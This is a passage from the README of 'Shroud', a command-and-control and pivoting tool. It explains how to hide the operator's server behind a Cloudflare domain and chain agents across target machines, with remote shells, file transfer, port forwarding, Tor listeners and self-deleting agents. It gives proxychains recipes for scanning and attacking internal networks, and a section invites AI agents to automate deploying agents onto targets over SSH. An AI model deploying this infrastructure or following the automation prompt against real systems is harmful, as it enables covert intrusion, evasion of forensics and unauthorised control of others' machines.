                       Agent can only see this      Admin real IP hidden here
```

**Step 1: Domain and CDN Configuration**

1. Register a domain (e.g., `c2.example.com`), host DNS on Cloudflare
2. Add an A record in Cloudflare DNS pointing to your Nginx server IP, **enable the orange cloud (Proxy)**
3. Cloudflare SSL/TLS settings:
   - Mode: `Full` or `Full (Strict)` (use Strict if Nginx has a valid certificate)
   - Ensure Edge Certificates are enabled
4. Cloudflare Network settings:
   - **WebSockets: ON** (required, otherwise WS handshake will be blocked)

**Step 2: Nginx Configuration (Origin Server)**

```nginx
server {
    listen 443 ssl;
    server_name c2.example.com;
    ssl_certificate     /path/to/cert.pem;    # Cloudflare Origin Certificate works
    ssl_certificate_key /path/to/key.pem;

    location / {
        proxy_pass http://127.0.0.1:8000;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection "upgrade";
        proxy_read_timeout 86400s;
    }
}
```

> Cloudflare provides free Origin Certificates (15-year validity) under SSL/TLS → Origin Server. No need to purchase your own certificate.

**Step 3: Start Shroud**

```bash
# Operator (Admin, listening behind Nginx)
./shroud_admin -l 8000 -s <secret> --down ws --heartbeat --passphrase <pass>

# Target (Agent, connects to CDN domain)
./shroud_agent -c c2.example.com:443 -s <secret> \
  --up ws --tls-enable --domain c2.example.com --reconnect 30
```

**Security Effects:**

| Layer | Protection |
|-------|-----------|
| Agent's view | Only knows `c2.example.com`, DNS resolves to Cloudflare IPs, Admin real IP unknown |
| Network forensics | Traffic destination is a Cloudflare CDN IP, looks like normal HTTPS website access |
| CDN traced | Attacker must breach Cloudflare to find the Origin IP |
| Origin hardening | Nginx firewall allows only [Cloudflare IP ranges](https://www.cloudflare.com/ips/) inbound, drops everything else |

**Optional hardening:** Lock down Nginx to only accept connections from Cloudflare IPs, preventing direct Origin scanning:

```bash
# Only allow Cloudflare IPs to access Nginx port 443
for ip in $(curl -s https://www.cloudflare.com/ips-v4); do
  iptables -A INPUT -p tcp --dport 443 -s $ip -j ACCEPT
done
iptables -A INPUT -p tcp --dport 443 -j DROP
```

## Automated Deployment

Shroud's Admin supports `--script` mode, reading commands from stdin instead of an interactive terminal. This enables scripted and AI Agent automated deployments.

### Topology Descriptor Format

Describe your deployment topology in the following YAML format. An AI Agent or deployment script can use this to fully automate the process:

```yaml
# shroud-topology.yaml
secret: "<generate with: openssl rand -base64 24>"
passphrase: "<generate with: openssl rand -base64 24>"  # optional, encrypts identity files

admin:
  host: "operator.local"          # Operator workstation address
  listen: 9999                    # Admin listen port
  options: "--down ws --tls-enable --heartbeat --pad-size 4096"

agents:
  - name: "agent-0"
    host: "10.0.1.10"             # Target machine address
    ssh_user: "root"              # SSH login user
    ssh_port: 22                  # SSH port
    ssh_auth: "key"               # key or password
    ssh_key: "~/.ssh/id_ed25519"  # required when ssh_auth=key
    platform: "linux_amd64"       # build target: linux_amd64/linux_arm64/windows_amd64/...
    connect_to: "admin"           # connect target: admin or another agent's name
    options: "--up ws --tls-enable --reconnect 30 --sleep-mask"

  - name: "agent-1"
    host: "10.0.2.20"
    ssh_user: "ubuntu"
    ssh_port: 22
    ssh_auth: "password"
    platform: "linux_amd64"
    connect_to: "agent-0"         # joins via agent-0's listen port
    options: "--up ws --tls-enable --reconnect 30"

  - name: "agent-2"
    host: "192.168.1.100"
    ssh_user: "admin"
    ssh_port: 22
    ssh_auth: "key"
    ssh_key: "~/.ssh/id_rsa"
    platform: "linux_arm64"
    connect_to: "agent-1"
    options: "--up ws --tls-enable --reconnect 30 --kill-date 2026-07-15 --self-delete"
```

### Execution Steps

An AI Agent or deployment script follows this sequence:

```
Step 1: Build
  make <platform>_agent    # build agent binary for each target platform
  make admin               # build admin binary

Step 2: Distribute
  For each agent node:
    scp shroud_agent_<platform> <ssh_user>@<host>:/tmp/shroud_agent

Step 3: Start Admin
  ./shroud_admin -l <listen_port> -s <secret> [options] --script < commands.txt
  # or without --script for interactive/AI-driven console operation

Step 4: Start first Agent (connect_to: admin)
  ssh <agent-0> "/tmp/shroud_agent -c <admin_host>:<port> -s <secret> [options] &"

Step 5: Chain remaining nodes
  For each agent where connect_to is not admin, in dependency order:
    a. In the Admin console, run listen on the parent node:
       use <parent_node_id>
       listen           # choose 1.Normal Passive, enter port
    b. SSH to the target machine and start the agent:
       ssh <agent-N> "/tmp/shroud_agent -c <parent_host>:<port> -s <secret> [options] &"

Step 6: Verify
  Run topo in the Admin console to confirm all nodes are online with the correct topology
```

### --script Mode Usage

The `--script` flag makes Admin read commands line-by-line from stdin, suitable for pipe input:

```bash
# Start admin and auto-open SOCKS5 proxy on node 0
echo -e "use 0\nsocks 7777" | ./shroud_admin -l 9999 -s <secret> --script

# Or read from a script file
cat <<'EOF' > commands.txt
use 0
listen
1
10000
EOF
./shroud_admin -l 9999 -s <secret> --script < commands.txt
```

In `--script` mode, Admin does not display interactive prompts. All output is still printed to stdout for AI Agent parsing. Admin exits automatically when stdin reaches EOF.

### Example Prompt for AI Agents

Provide the following (or a link to this README) to an AI Agent:

```
Please deploy a Shroud multi-hop proxy network.

Project: https://github.com/<your-repo>/Shroud
Topology: [paste the YAML above or describe your network structure]
Target machine SSH credentials: [provide or let the AI ask for each]

Follow the "Automated Deployment" section in the README:
Build → Distribute → Start Admin → Start Agents in order → Verify topology
```

## Command analysis

In the admin console, you can use Tab for command completion and the arrow keys (up, down, left, right) to browse command history or move the cursor.

The admin console is divided into two levels. The first level is the main panel, which includes the following commands:

- `help`: Display help information for the main panel

```
(admin) >> help
  help                                     		Show help information
  detail                                  		Display connected nodes' detail
  topo                                     		Display nodes' topology
  use        <id>                          		Select the target node you want to use
  exit                                     		Exit Shroud
```

- `detail`: Display detailed information about online nodes

```
(admin) >> detail
Node[0] -> IP: 127.0.0.1:10000  Hostname: test-host.lan  User: operator
Memo:
```

- `topo`: Display the parent-child relationships of online nodes

```
(admin) >> topo
Node[0]'s children ->
Node[1]

Node[1]'s children ->
```

- `use`: Select a node

```
(admin) >> use 0
(node 0) >>
```

- `exit`: Exit shroud

```
(admin) >> exit
[*] Do you really want to exit shroud?(y/n): y
[*] BYE!
```

When you select a node with `use`, the admin enters the second level (node panel), which includes the following commands:

- `help`: Display the help information for the node panel

```
(node 0) >> help
  help                                            Show help information
  status                                          Show node status,including socks/forward/backward
  listen                                          Start port listening on current node
  addmemo    <string>                             Add memo for current node
  delmemo                                         Delete memo of current node
  ssh        <ip:port>                            Start SSH through current node
  shell                                           Start an interactive shell on current node
  socks      <lport> [username] [pass]            Start a socks5 server
  stopsocks                                       Shut down socks services
  connect    <ip:port>                            Connect to a new node
  sshtunnel  <ip:sshport> <agent port>            Use sshtunnel to add the node into our topology
  upload     <local filename> <remote filename>   Upload file to current node
  download   <remote filename> <local filename>   Download file from current node
  forward    <lport> <ip:port>                    Forward local port to specific remote ip:port
  stopforward                                     Shut down forward services
  backward    <rport> <lport>                     Backward remote port(agent) to local port(admin)
  stopbackward                                    Shut down backward services
  transport  <tor|raw>                            Switch transport mode (tor = stealth, raw = performance)
  newcircuit                                      Request a new Tor circuit for this node
  shutdown                                        Terminate current node
  back                                            Back to parent panel
  exit                                            Exit Shroud 
```

- `status`: Display the socks/forward/backward status of the current node

```
(node 0) >> status
Socks status:
      ListenAddr: 127.0.0.1:10000    Username:    Password:
-------------------------------------------------------------------------------------------
Forward status:
      [1] Listening Addr: [::]:20000 , Remote Addr: 192.168.1.1:22 , Active Connections: 0
      [2] Listening Addr: [::]:30000 , Remote Addr: 192.168.1.1:22 , Active Connections: 0
-------------------------------------------------------------------------------------------
Backward status:
      [1] Remote Port: 40000 , Local Port: 50000 , Active Connections: 0
```

- `listen`: Instruct the node to listen on a specific port and wait for connection from child node

```
(node 0) >> listen
[*] MENTION! If you choose IPTables Reuse or SOReuse, you MUST CONFIRM that the node was initially started in the corresponding way!
[*] When you choose IPTables Reuse or SOReuse, the node will use the initial config(when node started) to reuse port!
[*] Please choose the mode(1.Normal passive / 2.IPTables Reuse / 3.SOReuse / 4.Tor Hidden Service): 1
[*] Please input the [ip:]<port> : 10001
[*] Waiting for response......
[*] Node is listening on 10001
```

Note that `listen` is a special command. As you can see, the `listen` command has four modes

1. `Normal passive`: This option implies that the agent will listen on the target port in a normal way and wait for child nodes to connect.
2. `IPTables Reuse`: This option implies that the agent will reuse the port using IPTables and wait for child nodes to connect.
3. `SOReuse`: This option implies that the agent will reuse the port using SOReuse and wait for child nodes to connect.
4. `Tor Hidden Service`: This option implies that the agent will register a Tor hidden service and wait for child nodes to connect through Tor.

The first mode is the most commonly used. If the parent node is listening in this way, child nodes only need to use `-c parent_node_ip:port` to join the network.

The second and third modes are rather unique. If the user selects the second or third mode, they must ensure that the node they are currently operating on has been started using port reuse. Otherwise, these two modes cannot be used.

In the second and third modes, users won't need to input any information. The node will automatically reuse the port using the parameters set at its own startup and prepare to accept connections from child nodes.

The fourth mode registers the agent as a Tor hidden service. The agent must have access to a running Tor daemon with the control port enabled. The `.onion` address will be displayed once the service is registered, and child nodes can connect using `--tor-proxy`.

Furthermore, the `listen` command can only accept one child node connection at a time. If multiple child nodes need to connect, please execute the `listen` command the corresponding number of times.

- `addmemo`: Add a memo for the current node

```
(node 0) >> addmemo test
[*] Memo added!
(node 0) >> exit
(admin) >> detail
Node[0] -> IP: 127.0.0.1:10000  Hostname: test-host.lan  User: operator
Memo:  test
```

- `delmemo`: Delete the memo of the current node

```
(node 0) >> delmemo
[*] Memo deleted!
(node 0) >> exit
(admin) >> detail
Node[0] -> IP: 127.0.0.1:10000  Hostname: test-host.lan  User: operator
Memo:
```

- `ssh`: Instruct the node to establish an SSH connection to the target.

```
(node 0) >> ssh 127.0.0.1:22
[*] Please choose the auth method(1.username&&password / 2.certificate): 1
[*] Please enter the username: operator
[*] Please enter the password: *****
[*] Waiting for response.....
[*] Connect to target host via ssh successfully!
$ whoami
operator
$
```

Under this mode, the tab key will be disabled

- `shell`: Get the shell of the current node

```
(node 0) >> shell
[*] Waiting for response.....
[*] Shell is started successfully!

bash: no job control in this shell

bash-3.2$ whoami
operator
bash-3.2$
```

Under this mode, the tab key will be disabled

- `socks`: Start the socks5 service on the current node

```
(node 0) >> socks 7777
[*] Trying to listen on 127.0.0.1:7777......
[*] Waiting for response......
[*] Socks start successfully!
(node 0) >>
```

Please note that the port 7777 is not opened on the agent, but rather on the admin

If you need to set a username and password, you can modify the above command to `socks 7777 <your username> <your password>`

If you need to specify the interface to listen on, you can modify the above command to `socks xxx.xxx.xxx.xxx:7777`

- `stopsocks`: Stop the SOCKS5 service on the current node

```
(node 0) >> stopsocks
Socks Info ---> ListenAddr: 127.0.0.1:7777    Username: <null>    Password: <null>
[*] Do you really want to shut down socks?(yes/no): yes
[*] Closing......
[*] Socks service has been closed successfully!
(node 0) >>
```

#### Proxy Usage Guide

After running `socks 7777`, Admin opens a SOCKS5 listener on **127.0.0.1:7777 locally**. All traffic through this port is tunneled through the node chain to the target network. Below is how to route your tools through this tunnel.

> **Concept Distinction**
> | | `--socks5-proxy` flag | `socks` command |
> |--|--|--|
> | Purpose | Agent/Admin connects through a corporate proxy | SOCKS5 entry point for the Operator's tools |
> | Who uses it | Shroud nodes during connection phase | Your nmap/curl/browser etc. |
> | Direction | Agent → Corporate Proxy → Admin | Your tool → Admin:7777 → Agent → Target |

**Method 1: proxychains4 (Recommended)**

Most pentesting tools lack native SOCKS5 support. proxychains4 wraps any process and hijacks all TCP connections:

```bash
# 1. Install
apt install proxychains4    # Debian/Ubuntu
brew install proxychains-ng # macOS

# 2. Configure /etc/proxychains4.conf (or ~/.proxychains/proxychains.conf)
#    Change the [ProxyList] section at the end to:
socks5 127.0.0.1 7777
#    If authentication is required:
socks5 127.0.0.1 7777 username password

#    Make sure this line is uncommented (prevents DNS leaks):
proxy_dns

# 3. Use — prepend proxychains4 to any command
proxychains4 nmap -sT -Pn 10.0.0.0/24      # TCP port scan
proxychains4 curl http://10.0.0.1:8080      # HTTP request
proxychains4 ssh user@10.0.0.5              # SSH login
proxychains4 crackmapexec smb 10.0.0.0/24   # Batch SMB scan
proxychains4 python3 exploit.py             # Any script
```

proxychains4 wraps the **process**, not individual requests. Batch scans, multi-threaded tools, and scripts all work seamlessly.

**Method 2: Native SOCKS5 Support**

Some tools have built-in proxy options — no proxychains needed:

```bash
# curl
curl --socks5-hostname 127.0.0.1:7777 http://10.0.0.1:8080

# wget
wget -e "use_proxy=yes" -e "socks_proxy=socks5://127.0.0.1:7777" http://10.0.0.1

# Firefox / Burp Suite
#   Settings → Network → Manual Proxy → SOCKS Host: 127.0.0.1, Port: 7777, SOCKS v5
#   Check "Proxy DNS when using SOCKS v5"

# Python requests (via PySocks)
pip install requests[socks]
proxies = {"http": "socks5h://127.0.0.1:7777", "https": "socks5h://127.0.0.1:7777"}
requests.get("http://10.0.0.1", proxies=proxies)
```

> `socks5h://` means DNS is resolved at the remote end, preventing local DNS leaks. `socks5://` resolves DNS locally.

**Method 3: Environment Variables (limited tool support)**

```bash
export ALL_PROXY=socks5h://127.0.0.1:7777
curl http://10.0.0.1   # curl reads ALL_PROXY
```

Note: Most pentesting tools (nmap, masscan, etc.) **do not** read proxy environment variables — use proxychains4 instead.

**Important Notes**

- **TCP only**: proxychains4 only hijacks TCP connections. `nmap -sU` (UDP scan) and `ping` (ICMP) cannot be proxied — use `nmap -sT` instead
- **DNS leaks**: Always enable `proxy_dns` (proxychains) or use `socks5h://` (native support), otherwise DNS queries go out directly from your machine, exposing target hostnames
- **Performance**: Multi-hop tunneling adds latency. For batch scans, reduce concurrency (e.g., `nmap -T3`) to avoid tunnel congestion
- **UDP limitations**: Shroud's SOCKS5 supports standard RFC1928 UDP ASSOCIATE, but most scanning tools have incompatible UDP implementations. For UDP scans, run them locally on the target after obtaining a shell

- `connect`: Instruct the current node to connect to another child node

```
agent-1: ./shroud_agent -l 10002
```

```
(node 0) >> connect 127.0.0.1:10002
[*] Waiting for response......
[*] New node online! Node id is 1

(node 0) >>
```

- `sshtunnel`: Instruct the current node to connect to another child node via ssh tunnel

```
agent-2: ./shroud_agent -l 10003
```

```
(node 0) >> sshtunnel 127.0.0.1:22 10003
[*] Please choose the auth method(1.username&&password / 2.certificate): 1
[*] Please enter the username: operator
[*] Please enter the password: ******
[*] Waiting for response.....
[*] New node online! Node id is 2

(node 0) >>
```

In highly restricted environments, Shroud can use SSH tunneling to disguise its traffic as SSH and bypass firewall restrictions.

- `upload`: Upload file to the current node

```
(node 0) >> upload test.7z test.xxx
[*] File transmitting, please wait...
136.07 KiB / 136.07 KiB [-----------------------------------------------------------------------------------] 100.00% ? p/s 0s
```

- `download`: Download file from the current node

```
(node 0) >> download test.xxx test.xxxx
[*] File transmitting, please wait...
136.07 KiB / 136.07 KiB [-----------------------------------------------------------------------------------] 100.00% ? p/s 0s
```

- `forward`: Map port on the admin to remote port

```
(node 0) >> forward 9000 127.0.0.1:22
[*] Trying to listen on 127.0.0.1:9000......
[*] Waiting for response......
[*] Forward start successfully!
(node 0) >>
```

```
$ ssh 127.0.0.1 -p 9000
Password:
$
```

- `stopforward`: Close the remote mapping on the admin

```
(node 0) >> stopforward
[0] All
[1] Listening Addr : [::]:9000 , Remote Addr : 127.0.0.1:22 , Active Connections : 1
[*] Do you really want to shut down forward?(yes/no): yes
[*] Please choose one to close: 1
[*] Closing......
[*] Forward service has been closed successfully!
```

- `backward`: Reverse map the port on the current agent to the local port on the admin

```
(node 0) >> backward 9001 22
[*] Trying to ask node to listen on 127.0.0.1:9001......
[*] Waiting for response......
[*] Backward start successfully!
(node 0) >>
```

```
$ ssh 127.0.0.1 -p 9001
Password:
$
```

- `stopbackward`: Close the reverse mapping on the current node

```
(node 0) >> stopbackward
[0] All
[1] Remote Port : 9001 , Local Port : 22 , Active Connections : 1
[*] Do you really want to shut down backward?(yes/no): yes
[*] Please choose one to close: 1
[*] Closing......
[*] Backward service has been closed successfully!
```

- `transport`: Switch the transport mode between Tor and raw TCP

```
(node 0) >> transport tor
[*] Transport switched to Tor mode
```

```
(node 0) >> transport raw
[*] Transport switched to raw mode
```

- `newcircuit`: Request a new Tor circuit for the current node

```
(node 0) >> newcircuit
[*] New Tor circuit established
```

- `shutdown`: Take the current node offline

```
(node 1) >> shutdown
(node 1) >>
[*] Node 1 is offline!
```

- `back`: Return to main panel

```
(node 1) >> back
(admin) >>
```

- `exit`: Exit Shroud 

```
(node 1) >> exit
[*] Do you really want to exit shroud?(y/n): y
[*] BYE!
```

### Attention

- The admin node MUST be online if you want to add a new node into the network
- The admin only supports one directly connected agent node, but the agent node has no such restriction
- If you run the admin on Windows, download [ansicon](https://github.com/adoxa/ansicon/releases) first. Then go to the folder matching your system architecture and run `ansicon.exe -i`; otherwise, garbled characters may appear in the admin console.
- This program only supports the standard `UDP ASSOCIATE` described in [RFC1928](https://www.ietf.org/rfc/rfc1928.txt). Please check the tools you are using (scanners, etc.) and make sure their packet construction complies with RFC1928. Packet loss handling is also your responsibility
- When a node goes offline, all socks, forward, and backward services related to that node and its child nodes are forcibly stopped
- If a branch disconnects due to a middle node going offline, you **must reconnect to the head node of the missing chain** — do not skip intermediate nodes and connect directly to a tail node, otherwise the intermediate subtree will not recover
- In IPTABLES port-reuse mode, if the agent is killed with `kill -9`, iptables rules cannot be cleaned up automatically — run `python reuse.py --stop --rhost <ip> --rport <port>` manually to restore the original service
- IPTABLES port-reuse mode forces listening on `0.0.0.0` and cannot be overridden with `-l`

